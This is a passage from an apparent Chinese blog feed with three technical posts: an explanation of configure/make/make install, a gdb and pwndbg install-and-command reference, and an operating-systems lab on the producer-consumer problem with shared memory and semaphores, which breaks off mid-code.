    <title>linux命令详解 ./configure、make、make install 命令</title>
    <link href="/2021/12/01/linux%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"/>
    <url>/2021/12/01/linux%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>这些都是典型的使用GNU的AUTOCONF和AUTOMAKE产生的程序的安装步骤</p><h2 id="一、基本信息"><a href="#一、基本信息" class="headerlink" title="一、基本信息"></a>一、基本信息</h2><p>1、./configure 是用来检测你的安装平台的目标特征的。比如它会检测你是不是有CC或GCC，并不是需要CC或GCC，它是个shell脚本。</p><p>2、make 是用来编译的，它从Makefile中读取指令，然后编译。</p><p>3、make install是用来安装的，它也从Makefile中读取指令，安装到指定的位置。</p><p>注意：AUTOMAKE和AUTOCONF是非常有用的用来发布C程序的东西。</p><h2 id="二、详细解释"><a href="#二、详细解释" class="headerlink" title="二、详细解释"></a>二、详细解释</h2><h3 id="1、configure命令"><a href="#1、configure命令" class="headerlink" title="1、configure命令"></a>1、configure命令</h3><p>这一步一般用来生成 Makefile，为下一步的编译做准备，你可以通过在 configure 后加上参数来对安装进行控制，比如代码:./configure –prefix=/usr 意思是将该软件安装在 /usr 下面，执行文件就会安装在 /usr/bin （而不是默认的 /usr/local/bin),资源文件就会安装在 /usr/share（而不是默认的/usr/local/share）。同时一些软件的配置文件你可以通过指定 –sys-config= 参数进行设定。有一些软件还可以加上 –with、–enable、–without、–disable 等等参数对编译加以控制，你可以通过允许 ./configure –help 察看详细的说明帮助。</p><p><img src="/2021/12/01/linux%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/image-20211201145802464.png" alt="image-20211201145802464"></p><h3 id="2、make"><a href="#2、make" class="headerlink" title="2、make"></a>2、make</h3><p>这一步就是编译，大多数的源代码包都经过这一步进行编译（当然有些perl或python编写的软件需要调用perl或python来进行编译）。如果 在 make 过程中出现 error ，你就要记下错误代码（注意不仅仅是最后一行），然后你可以向开发者提交 bugreport（一般在 INSTALL 里有提交地址），或者你的系统少了一些依赖库等，这些需要自己仔细研究错误代码。</p><p>可能遇到的错误：make *** 没有指明目标并且找不到 makefile。 停止。问题很明了，没有Makefile，怎么办，原来是要先./configure 一下，再make。</p><h3 id="3、make-insatll"><a href="#3、make-insatll" class="headerlink" title="3、make insatll"></a>3、make insatll</h3><p>这条命令来进行安装（当然有些软件需要先运行 make check 或 make test 来进行一些测试），这一步一般需要你有 root 权限（因为要向系统写入文件）。</p><h2 id="三、扩展说明"><a href="#三、扩展说明" class="headerlink" title="三、扩展说明"></a>三、扩展说明</h2><p>Linux的用户可能知道，在Linux下安装一个应用程序时，一般先运行脚本configure，然后用make来编译源程序，在运行make install，最后运行make clean删除一些临时文件。使用上述三个自动工具，就可以生成configure脚本。运行configure脚本，就可以生成Makefile文件，然后就可以运行make、make install和make clean。</p><p>configure是一个shell脚本，它可以自动设定源程序以符合各种不同平台上Unix系统的特性，并且根据系统叁数及环境产生合适的Makefile文件或是C的头文件(header file)，让源程序可以很方便地在这些不同的平台上被编译连接。</p><p>这时，就可运行configure脚本了，运行configure脚本，就可产生出符合GNU规范的Makefile文件了： $ ./configure</p><p>到此时，就可以运行make进行编译，在运行make install进行安装了，最后运行make clean删除临时文件。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>make<br><span class="hljs-variable">$ </span>make install           (注：运行这个要有足够的权限)<br><span class="hljs-variable">$ </span>make clean<br></code></pre></td></tr></table></figure><p>利用configure所产生的Makefile文件有几个预设的目标可供使用，其中几个重要的简述如下：</p><ul><li><p>make all：产生我们设定的目标，即此范例中的可执行文件。只打make也可以，此时会开始编译原始码，然后连结，并且产生可执行文件。</p></li><li><p>make clean：清除编译产生的可执行文件及目标文件(object file，*.o)。</p></li><li><p>make distclean：除了清除可执行文件和目标文件外，把configure所产生的Makefile也清除掉。</p></li><li><p>make install：将程序安装至系统中。如果原始码编译无误，且执行结果正确，便可以把程序安装至系统预设的可执行文件存放路径。如果用bin_PROGRAMS宏的话，程序会被安装至/usr/local/bin这个目录。</p></li><li><p>make dist：将程序和相关的档案包装成一个压缩文件以供发布。执行完在目录下会产生一个以PACKAGE-VERSION.tar.gz为名称的文件。 PACKAGE和VERSION这两个变数是根据configure.in文件中AM_INIT_AUTOMAKE(PACKAGE，VERSION)的定义。在此范例中会产生test-1.0.tar.gz的档案。</p></li><li><p>make distcheck：和make dist类似，但是加入检查包装后的压缩文件是否正常。这个目标除了把程序和相关文件包装成tar.gz文件外，还会自动把这个压缩文件解开，执行 configure，并且进行make all 的动作，确认编译无误后，会显示这个tar.gz文件可供发布了。这个检查非常有用，检查过关的包，基本上可以给任何一个具备GNU开发环境-的人去重新编译。</p></li></ul><p>参考链接：<a href="https://www.cnblogs.com/tinywan/p/7230039.html">Linux 命令详解（三）./configure、make、make install 命令</a></p>]]></content>
    
    
    <categories>
      
      <category>linux基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwndbg的安装和gdb使用</title>
    <link href="/2021/12/01/gdb%E8%B0%83%E8%AF%95%E5%92%8Cpwngdb%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2021/12/01/gdb%E8%B0%83%E8%AF%95%E5%92%8Cpwngdb%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="一、pwndbg安装"><a href="#一、pwndbg安装" class="headerlink" title="一、pwndbg安装"></a>一、pwndbg安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs terminal">git clone https://github.com/pwndbg/pwndbg<br>cd pwndbg<br>./setup.sh<br></code></pre></td></tr></table></figure><p>然后我们可以查看.gdbinit中的内容</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">cat <span class="hljs-string">.gdbinit</span><br></code></pre></td></tr></table></figure><p><img src="/2021/12/01/gdb%E8%B0%83%E8%AF%95%E5%92%8Cpwngdb%E7%9A%84%E4%BD%BF%E7%94%A8/image-20211201173406772.png" alt="image-20211201173406772"></p><p>如何之前没有安装过别的插件，则只会显示有最后一行，如果安装过，则将前面的注释掉即可</p><p>插件功能都差不多，选择一个即可，倒也不必每个都装。最后选了pwndbg单纯觉得好看。</p><p>pwndbg基本界面如图：</p><p><img src="/2021/12/01/gdb%E8%B0%83%E8%AF%95%E5%92%8Cpwngdb%E7%9A%84%E4%BD%BF%E7%94%A8/image-20211201173706711.png" alt="image-20211201173706711"></p><h2 id="二、gdb的使用"><a href="#二、gdb的使用" class="headerlink" title="二、gdb的使用"></a>二、gdb的使用</h2><h3 id="基本指令"><a href="#基本指令" class="headerlink" title="基本指令"></a>基本指令</h3><ul><li><code>help</code> //帮助</li><li><code>i</code> //info，查看一些信息，只输入info可以看可以接什么参数，下面几个比较常用<ul><li><code>i b</code> //<strong>常用</strong>，info break 查看所有断点信息（编号、断点位置）</li><li><code>i r</code> //<strong>常用</strong>，info registers 查看各个寄存器当前的值</li><li><code>i f</code> //info function 查看所有函数名，需保留符号</li></ul></li><li><code>show</code> //和info类似，但是查看调试器的基本信息，如：<ul><li>show args //查看参数</li></ul></li><li><code>rdi</code> //<strong>常用</strong>，+寄存器名代表一个寄存器内的值，用在地址上直接相当与一个十六进制变量</li><li><code>backtrace</code> //查看调用栈</li><li><code>q</code> //quit 退出，常用</li></ul><h3 id="执行指令"><a href="#执行指令" class="headerlink" title="执行指令"></a>执行指令</h3><ul><li><code>s</code> //s<strong>单步步入</strong>，遇到调用跟进函数中，相当于step into，源码层面的一步</li><li><code>si</code> //<strong>常用</strong>，同s，汇编层面的一步</li><li><code>n</code> //next,<strong>单步补过</strong>，遇到调用不跟进，相当于step over，源码层面的一步</li><li><code>ni</code> //nexti,<strong>常用</strong>，同n，汇编层面的一步</li><li><code>c</code> //continue，常用，继续执行到断点，没断点就一直执行下去</li><li><code>r</code> //run，常用，重新开始执行</li></ul><h3 id="断点指令"><a href="#断点指令" class="headerlink" title="断点指令"></a>断点指令</h3><h4 id="下普通断点指令b-break-："><a href="#下普通断点指令b-break-：" class="headerlink" title="下普通断点指令b(break)："></a><strong>下普通断点指令b(break)：</strong></h4><ul><li><code>b *(0x123456)</code> //<strong>常用</strong>，给0x123456地址处的指令下断点<ul><li>b *$ rebase(0x123456) //$rebase 在调试开PIE的程序的时候可以直接加上程序的随机地址</li></ul></li><li><code>b function_name</code> //<strong>常用</strong>，给函数fun_name下断点，目标文件要保留符号才行</li><li><code>b file_name:fun_name</code></li><li><code>b file_name:15</code> //给file_name的15行下断点，要有源码才行<ul><li><code>b 15</code>//单个文件的第15行</li></ul></li><li><code>b +0x10</code> //在程序当前停住的位置下0x10的位置下断点，同样可以-0x10，就是前0x10</li><li><code>break fun if \$rdi==5</code> //条件断点，rdi值为5的时候才断</li></ul><h4 id="删除、禁用断点："><a href="#删除、禁用断点：" class="headerlink" title="删除、禁用断点："></a><strong>删除、禁用断点：</strong></h4><p>使用info break(简写: i b)来查看断点编号</p><ul><li><code>delete 5</code> //<strong>常用</strong>，删除5号断点，直接delete不接数字删除所有</li><li><code>disable 5</code> //<strong>常用</strong>，禁用5号断点</li><li><code>enable 5</code> //启用5号断点</li><li><code>clear</code> //不加参数默认清除当前函数所在行的所有断点<ul><li><code>clear function</code>//删除该函数内的所有断点</li><li><code>clear line</code>//删除该行的所有断点</li></ul></li></ul><h4 id="内存断点指令watch："><a href="#内存断点指令watch：" class="headerlink" title="内存断点指令watch："></a><strong>内存断点指令watch：</strong></h4><ul><li><code>watch 0x123456</code> //0x123456地址的数据改变的时候会断</li><li><code>watch a</code> //变量a改变的时候会断</li><li><code>info watchpoints</code> //查看watch断点信息</li></ul><h4 id="捕获断点catch："><a href="#捕获断点catch：" class="headerlink" title="捕获断点catch："></a><strong>捕获断点catch：</strong></h4><ul><li><code>catch syscall</code> //syscall系统调用的时候断住</li><li><code>tcatch syscall</code> //syscall系统调用的时候断住，只断一次</li><li><code>info break</code> //catch的断点可以通过i b查看</li></ul><blockquote><p>除syscall外还可以使用的有：</p><p>1）throw: 抛出异常</p><p>2）catch: 捕获异常</p><p>3）exec: exec被调用</p><p>4）fork: fork被调用</p><p>5）vfork: vfork被调用</p><p>6）load: 加载动态库</p><p>7）load libname: 加载名为libname的动态库</p><p>8）unload: 卸载动态库</p><p>9）unload libname: 卸载名为libname的动态库</p><p>10）syscall [args]: 调用系统调用，args可以指定系统调用号，或者系统名称</p></blockquote><h3 id="打印指令"><a href="#打印指令" class="headerlink" title="打印指令"></a>打印指令</h3><h4 id="查看内存指令x："><a href="#查看内存指令x：" class="headerlink" title="查看内存指令x："></a><strong>查看内存指令x：</strong></h4><ul><li><p><code>x /nuf 0x123456</code> //<strong>常用</strong>，x指令的格式是：x空格/nfu，nfu代表三个参数</p><ul><li>n代表显示几个单元（而不是显示几个字节，后面的u表示一个单元多少个字节），放在’/‘后面</li><li>u代表一个单元几个字节，b(一个字节)，h(二个字节)，w(四字节)，g(八字节)</li><li>f代表显示数据的格式，f和u的顺序可以互换，也可以只有一个或者不带n，用的时候很灵活<ul><li>x 按十六进制格式显示变量。<br>d 按十进制格式显示变量。<br>u 按十六进制格式显示无符号整型。<br>o 按八进制格式显示变量。<br>t 按二进制格式显示变量。<br>a 按十六进制格式显示变量。<br>c 按字符格式显示变量。<br>f 按浮点数格式显示变量。<br>s 按字符串显示。<br>b 按字符显示。<br>i 显示汇编指令。</li></ul></li></ul></li><li><p><code>x /10gx 0x123456</code> //<strong>常用</strong>，从0x123456开始每个单元八个字节，十六进制显示是个单元的数据</p></li><li><p><code>x /10xd \$rdi</code> //从rdi指向的地址向后打印10个单元，每个单元4字节的十进制数</p></li><li><p><code>x /10i 0x123456</code> //<strong>常用</strong>，从0x123456处向后显示十条汇编指令</p></li></ul><h4 id="打印指令p-print-："><a href="#打印指令p-print-：" class="headerlink" title="打印指令p(print)："></a><strong>打印指令p(print)：</strong></h4><ul><li><code>p fun_name</code> //打印fun_name的地址，需要保留符号</li><li><code>p 0x10-0x08</code> //计算0x10-0x08的结果</li><li><code>p &amp;a</code> //查看变量a的地址</li><li><code>p *(0x123456)</code> //查看0x123456地址的值，注意和x指令的区别，x指令查看地址的值不用星号</li><li><code>p \$rdi</code> //显示rdi寄存器的值，注意和x的区别，这只是显示rdi的值，而不是rdi指向的值</li><li><code>p *($rdi)</code> //显示rdi指向的值</li></ul><h4 id="打印汇编指令disass："><a href="#打印汇编指令disass：" class="headerlink" title="打印汇编指令disass："></a><strong>打印汇编指令disass</strong>：</h4><p><strong>disassemble</strong>的缩写</p><ul><li><code>disass 0x123456</code> //显示0x123456前后的汇编指令</li><li><code>x /10i</code> //我一般喜欢用x显示指令</li></ul><h4 id="打印源代码指令list："><a href="#打印源代码指令list：" class="headerlink" title="打印源代码指令list："></a><strong>打印源代码指令list：</strong></h4><ul><li><code>list</code> //查看当前附近10行代码，要有源码，list指令pwn题中几乎不用，但为了完整性还是简单举几个例子</li><li><code>list 38</code> //查看38行附近10行代码</li><li><code>list 1,10</code> //查看1-10行</li><li><code>list main</code> //查看main函数开始10行</li></ul><h3 id="修改和查找指令"><a href="#修改和查找指令" class="headerlink" title="修改和查找指令"></a><strong>修改和查找指令</strong></h3><h4 id="修改数据指令set："><a href="#修改数据指令set：" class="headerlink" title="修改数据指令set："></a><strong>修改数据指令set：</strong></h4><ul><li><code>set $​rdi=0x10</code> //把rdi寄存器的值变为0x10</li><li><code>set *(0x123456)=0x10</code> //0x123456地址的值变为0x10，注意带星号</li><li><code>set args “abc” “def” “gh“</code>//给参数123赋值</li><li><code>set args “python -c ‘print</code> “1234\x7f\xde”’” //使用python给参数赋值不可见字符</li></ul><h4 id="查找数据："><a href="#查找数据：" class="headerlink" title="查找数据："></a><strong>查找数据：</strong></h4><ul><li><code>search rdi</code> //从当前位置向后查包含rdi的指令，返回若干</li><li><code>search -h</code> //查看search帮助，我也不太长用这个指令</li><li><code>find “hello”</code> //查找hello字符串，pwndbg独有</li><li><code>ropgadget</code> //查找ropgadget，pwndbg独有，没啥用，可以用其他工具</li></ul><h3 id="堆操作指令"><a href="#堆操作指令" class="headerlink" title="堆操作指令"></a>堆操作指令</h3><p>pwndbg插件独有</p><ul><li><code>arena</code> //显示arena的详细信息</li><li><code>arenas</code> //显示所有arena的基本信息</li><li><code>arenainfo</code> //好看的显示所有arena的信息</li><li><code>bins</code> //常用，查看所有种类的堆块的链表情况</li><li><code>fastbins</code> //单独查看fastbins的链表情况</li><li><code>largebins</code> //同上，单独查看largebins的链表情况</li><li><code>smallbins</code> //同上，单独查看smallbins的链表情况</li><li><code>unsortedbin</code> //同上，单独查看unsortedbin链表情况</li><li><code>tcachebins</code> //同上，单独查看tcachebins的链表情况</li><li><code>tcache</code> //查看tcache详细信息</li><li><code>heap</code> //数据结构的形式显示所有堆块，会显示一大堆</li><li><code>heapbase</code> //查看堆起始地址</li><li><code>heapinfo、heapinfoall</code> //显示堆得信息，和bins的挺像的，没bins好用</li><li><code>parseheap</code> //显示堆结构，很好用</li><li><code>tracemalloc</code> //好用，会跟提示所有操作堆的地方</li></ul><h3 id="其他pwndbg插件独有指令"><a href="#其他pwndbg插件独有指令" class="headerlink" title="其他pwndbg插件独有指令"></a><strong>其他pwndbg插件独有指令</strong></h3><ul><li><p><code>cyclc 50</code> //生成50个用来溢出的字符，如：aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama</p></li><li><p><code>$reabse</code> //开启PIE的情况的地址偏移</p></li><li><p><code>b *$reabse(0x123456)</code> //断住PIE状态下的二进制文件中0x123456的地方</p></li><li><p><code>codebase</code> //打印PIE偏移，与rebase不同，这是打印，rebase是使用</p></li><li><p><code>stack</code> //查看栈</p></li><li><p><code>retaddr</code> //打印包含返回地址的栈地址</p></li><li><p><code>canary</code> //直接看canary的值</p></li><li><p><code>plt</code> //查看plt表</p></li><li><p><code>got</code> //查看got表</p></li><li><p><code>hexdump</code> //想IDA那样显示数据，带字符串</p></li></ul><p>参考链接：<a href="https://blog.csdn.net/Breeze_CAT/article/details/103789233">gdb+pwndbg食用指南</a></p>]]></content>
    
    
    <categories>
      
      <category>linux基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>gdb</tag>
      
      <tag>linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统实验六-生产者消费者问题</title>
    <link href="/2021/11/30/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0/"/>
    <url>/2021/11/30/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="一、实验内容"><a href="#一、实验内容" class="headerlink" title="一、实验内容"></a>一、实验内容</h2><ul><li>模拟操作系统中进程同步和互斥。</li></ul><h2 id="二、实验目的"><a href="#二、实验目的" class="headerlink" title="二、实验目的"></a>二、实验目的</h2><ul><li>熟悉临界资源、信号量及PV操作的定义与物理意义</li><li>了解进程通信的方法</li><li>掌握进程互斥与进程同步的相关知识</li><li>掌握用信号量机制解决进程之间的同步与互斥问题</li><li>实现生产者－消费者问题，深刻理解进程同步问题</li></ul><h2 id="三、实验题目"><a href="#三、实验题目" class="headerlink" title="三、实验题目"></a>三、实验题目</h2><h3 id="进程实现"><a href="#进程实现" class="headerlink" title="进程实现"></a>进程实现</h3><p>在Linux操作系统下用C实现经典同步问题：生产者—消费者，具体要求如下：</p><ol><li>一个大小为10的缓冲区，初始状态为空。</li><li>2个生产者，随机等待一段时间，往缓冲区中添加数据，若缓冲区已满，等待消费者取走数据之后再添加，重复10次。</li><li>2个消费者，随机等待一段时间，从缓冲区中读取数据，若缓冲区为空，等待生产者添加数据之后再读取，重复10次。</li></ol><p><strong>提示</strong><br>本实验的主要目的是模拟操作系统中进程同步和互斥。在系统进程并发执行异步推进的过程中，由于资源共享和进程间合作而造成进程间相互制约。进程间的相互制约有两种不同的方式。</p><ol><li>间接制约。这是由于多个进程共享同一资源（如CPU、共享输入/输出设备）而引起的，即共享资源的多个进程因系统协调使用资源而相互制约。</li><li>直接制约。只是由于进程合作中各个进程为完成同一任务而造成的，即并发进程各自的执行结果互为对方的执行条件，从而限制各个进程的执行速度。</li></ol><p>生产者和消费者是经典的进程同步问题，在这个问题中，生产者不断的向缓冲区中写入数据，而消费者则从缓冲区中读取数据。生产者进程和消费者对缓冲区的操作是互斥，即当前只能有一个进程对这个缓冲区进行操作，生产者进入操作缓冲区之前，先要看缓冲区是否已满，如果缓冲区已满，则它必须等待消费者进程将数据取出才能写入数据，同样的，消费者进程从缓冲区读取数据之前，也要判断缓冲区是否为空，如果为空，则必须等待生产者进程写入数据才能读取数据。</p><p>在这个问题当中，我们采用信号量机制进行进程之间的通信，设置两个信号量，空的信号量和满的信号量。在Linux系统中，一个或多个信号量构成一个信号量集合。使用信号量机制可以实现进程之间的同步和互斥，允许并发进程一次对一组信号量进行相同或不同的操作。每个P、V操作不限于减1或加1，而是可以加减任何整数。在进程终止时，系统可根据需要自动消除所有被进程操作过的信号量的影响</p><ol><li><p>缓冲区采用循环队列表示，利用头、尾指针来存放、读取数据，以及判断队列是否为空。缓冲区中数组大小为10；</p></li><li><p>利用随机函数rand()得到A～Z的一个随机字符，作为生产者每次生产的数据，存放到缓冲区中；</p></li><li><p>使用shmget()系统调用实现共享主存段的创建，shmget()返回共享内存区的ID。对于已经申请到的共享段，进程需把它附加到自己的虚拟空间中才能对其进行读写。</p></li><li><p>信号量的建立采用semget()函数，同时建立信号量的数量。在信号量建立后，调用semctl()对信号量进行初始化，例如本实验中，可以建立两个信号量SEM_EMPTY、SEM_FULL，初始化时设置SEM_EMPTY为10，SEM_FULL为0。使用操作信号的函数semop()做排除式操作，使用这个函数防止对共享内存的同时操作。对共享内存操作完毕后采用shmctl()函数撤销共享内存段。</p></li><li><p>使用循环，创建2个生产者以及2个消费者，采用函数fork()创建一个新的进程。</p></li><li><p>一个进程的一次操作完成后，采用函数fflush()刷新缓冲区。</p></li><li><p>程序最后使用semctl()函数释放内存。</p></li></ol><ul><li>主程序流程图：</li></ul><p><img src="/2021/11/30/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0/image-20211130105214487.png" alt="image-20211130105214487"></p><ul><li>生产者进程流程图</li></ul><p><img src="/2021/11/30/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0/image-20211130105238309.png" alt="image-20211130105238309"></p><ul><li>消费者进程流程图</li></ul><p><img src="/2021/11/30/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0/image-20211130105350695.png" alt="image-20211130105350695"></p><ul><li>P操作流程图</li></ul><p><img src="/2021/11/30/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0/image-20211130105635105.png" alt="image-20211130105635105"></p><ul><li>V操作流程图</li></ul><p><img src="/2021/11/30/%E7%94%9F%E4%BA%A7%E8%80%85%E6%B6%88%E8%B4%B9%E8%80%85%E9%97%AE%E9%A2%98%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0/image-20211130105654202.png" alt="image-20211130105654202"></p><h3 id="思考题-线程实现"><a href="#思考题-线程实现" class="headerlink" title="思考题 线程实现"></a>思考题 线程实现</h3><p>  采用线程来实现</p><h2 id="四、实验设计与过程"><a href="#四、实验设计与过程" class="headerlink" title="四、实验设计与过程"></a>四、实验设计与过程</h2><h3 id="进程实现-1"><a href="#进程实现-1" class="headerlink" title="进程实现"></a>进程实现</h3><h4 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h4><p>与信号量一样，在Linux中也提供了一组函数接口用于使用共享内存，而且使用共享共存的接口还与信号量的非常相似，而且比使用信号量的接口来得简单。它们声明在头文件 sys/shm.h 中。</p><h5 id="1、shmget-函数"><a href="#1、shmget-函数" class="headerlink" title="1、shmget()函数"></a>1、shmget()函数</h5><p>该函数用来创建共享内存，它的原型为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">shmget</span><span class="hljs-params">(<span class="hljs-keyword">key_t</span> key, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">int</span> shmflg)</span></span>;<br></code></pre></td></tr></table></figure><ul><li><p>第一个参数，与信号量的semget函数一样，程序需要提供一个参数key（非0整数），它有效地为共享内存段命名，shmget()函数成功时返回一个与key相关的共享内存标识符（非负整数），用于后续的共享内存函数。调用失败返回-1.</p><p>不相关的进程可以通过该函数的返回值访问同一共享内存，它代表程序可能要使用的某个资源，程序对所有共享内存的访问都是间接的，程序先通过调用shmget()函数并提供一个键，再由系统生成一个相应的共享内存标识符（shmget()函数的返回值），只有shmget()函数才直接使用信号量键，所有其他的信号量函数使用由semget函数返回的信号量标识符。</p></li><li><p>第二个参数，size以字节为单位指定需要共享的内存容量</p></li><li><p>第三个参数，shmflg是权限标志，它的作用与open函数的mode参数一样，如果要想在key标识的共享内存不存在时，创建它的话，可以与IPC_CREAT做或操作。共享内存的权限标志与文件的读写权限一样，举例来说，0644,它表示允许一个进程创建的共享内存被内存创建者所拥有的进程向共享内存读取和写入数据，同时其他用户创建的进程只能读取共享内存。</p></li></ul><h5 id="2、shmat-函数"><a href="#2、shmat-函数" class="headerlink" title="2、shmat()函数"></a>2、shmat()函数</h5><p>– at：attach</p><p>第一次创建完共享内存时，它还不能被任何进程访问，shmat()函数的作用就是用来启动对该共享内存的访问，并把共享内存连接到当前进程的地址空间。它的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">shmat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> shm_id, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *shm_addr, <span class="hljs-keyword">int</span> shmflg)</span></span>;<br></code></pre></td></tr></table></figure><ul><li><p>第一个参数，shm_id是由shmget()函数返回的共享内存标识。</p></li><li><p>第二个参数，shm_addr指定共享内存连接到当前进程中的地址位置，通常为空，表示让系统来选择共享内存的地址。</p></li><li><p>第三个参数，shm_flg是一组标志位，通常为0。</p></li></ul><p>调用成功时返回一个指向共享内存第一个字节的指针，如果调用失败返回-1.</p><h5 id="3、shmdt-函数"><a href="#3、shmdt-函数" class="headerlink" title="3、shmdt()函数"></a>3、shmdt()函数</h5><p>– dt：detach</p><p>该函数用于将共享内存从当前进程中分离。注意，将共享内存分离并不是删除它，只是使该共享内存对当前进程不再可用。它的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">shmdt</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *shmaddr)</span></span>;<br></code></pre></td></tr></table></figure><p>参数shmaddr是shmat()函数返回的地址指针，调用成功时返回0，失败时返回-1.</p><h5 id="4、shmctl-函数"><a href="#4、shmctl-函数" class="headerlink" title="4、shmctl()函数"></a>4、shmctl()函数</h5><p>– ctl：control</p><p>与信号量的semctl()函数一样，用来控制共享内存，它的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">shmctl</span><span class="hljs-params">(<span class="hljs-keyword">int</span> shm_id, <span class="hljs-keyword">int</span> command, struct shmid_ds *buf)</span></span>;<br></code></pre></td></tr></table></figure><ul><li><p>第一个参数，shm_id是shmget()函数返回的共享内存标识符。</p></li><li><p>第二个参数，command是要采取的操作，它可以取下面的三个值 ：</p><ul><li>IPC_STAT：把shmid_ds结构中的数据设置为共享内存的当前关联值，即用共享内存的当前关联值覆盖shmid_ds的值。</li><li>IPC_SET：如果进程有足够的权限，就把共享内存的当前关联值设置为shmid_ds结构中给出的值</li><li>IPC_RMID：删除共享内存段</li></ul></li><li><p>第三个参数，buf是一个结构指针，它指向共享内存模式和访问权限的结构。</p><p>shmid_ds结构 至少包括以下成员：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">shmid_ds</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">uid_t</span> shm_perm.uid;<br>    <span class="hljs-keyword">uid_t</span> shm_perm.gid;<br>    <span class="hljs-keyword">mode_t</span> shm_perm.mode;<br>&#125;;<br></code></pre></td></tr></table></figure></li></ul><h4 id="数据结构和符号说明"><a href="#数据结构和符号说明" class="headerlink" title="数据结构和符号说明"></a><strong>数据结构</strong>和符号说明</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//信号集合内的每个信号量的索引,</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEM_FULL 0</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEM_EMPTY 1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MUTEX 2</span><br><span class="hljs-comment">//缓冲区结构</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">my_buffer</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">int</span> out;<br><span class="hljs-keyword">int</span> in;<br><span class="hljs-keyword">char</span> str[MAX_BUFFER_SIZE];<br><span class="hljs-keyword">int</span> num; <span 